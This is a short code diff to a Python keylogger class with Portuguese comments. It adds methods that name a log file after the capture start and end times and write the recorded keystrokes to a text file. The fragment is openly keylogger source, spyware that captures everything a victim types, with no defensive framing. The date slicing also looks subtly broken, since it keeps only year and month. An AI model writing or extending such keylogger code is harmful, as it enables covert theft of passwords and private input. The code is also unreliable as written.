@@ -38,3 +38,15 @@ class KeyLogger:
                     # adiciona o nome da chave a variável global `self.log`
                 self.log += name
 
+        def update_filename(self):
+            # define o nome do arquivo a ser identificado pelas datas de início e fim
+
+            start_dt_str = str(self.start_dt)[:7].replace(" ", "-").replace(":", "")
+            end_dt_str = str(self.end_dt)[:7].replace(" ", "-").replace(":", "")
+            self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+
+        def report_to_file(self):
+            with open(f"{self.filename}.txt", "w") as f:
+                print(self.log, file=f)
+            print(f"[+] Saved {self.filename}.txt")
+
